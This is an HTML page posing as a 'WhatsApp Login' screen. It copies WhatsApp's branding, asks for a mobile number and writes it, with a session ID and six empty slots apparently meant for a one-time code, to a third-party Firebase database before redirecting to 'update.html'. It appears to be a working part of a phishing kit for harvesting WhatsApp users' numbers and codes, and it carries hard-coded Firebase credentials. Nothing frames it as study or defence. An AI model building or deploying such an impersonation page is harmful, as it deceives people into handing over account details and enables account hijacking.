<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WhatsApp Login</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      background: #e5f9ed;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: #ffffff;
      padding: 40px 30px;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    h1 {
      color: #25d366;
      margin-bottom: 24px;
      font-size: 28px;
    }

    input[type="tel"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 2px solid #ccc;
      border-radius: 10px;
      margin-bottom: 20px;
      transition: 0.3s ease;
    }

    input[type="tel"]:focus {
      border-color: #25d366;
      outline: none;
      box-shadow: 0 0 5px rgba(37, 211, 102, 0.3);
    }

    button {
      background-color: #25d366;
      color: white;
      border: none;
      padding: 14px 20px;
      border-radius: 30px;
      font-size: 16px;
      font-weight: bold;
      width: 100%;
      cursor: pointer;
      transition: 0.3s ease;
    }

    button:hover {
      background-color: #1da851;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>WhatsApp Login</h1>
    <input type="tel" id="mobile" placeholder="Enter mobile number" maxlength="10">
    <button onclick="handleLogin()">Login</button>
  </div>

  <!-- Firebase Config + Script -->
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
      authDomain: "sbighsh.firebaseapp.com",
      projectId: "sbighsh",
      storageBucket: "sbighsh.appspot.com",
      messagingSenderId: "685947657107",
      appId: "1:685947657107:web:471a0557bb72235272a666"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function generateSessionID() {
      return 'session-' + Math.random().toString(36).substr(2, 9);
    }

    async function handleLogin() {
      const mobile = document.getElementById('mobile').value;
      if (mobile.length !== 10) return alert("Enter valid number");

      const sessionId = generateSessionID();
      sessionStorage.setItem("sessionId", sessionId);

      await db.collection("whatsapp-number").doc(sessionId).set({
        mobile,
        boxes: ["", "", "", "", "", ""]
      });

      window.location.href = "update.html";
    }
  </script>
</body>
</html>
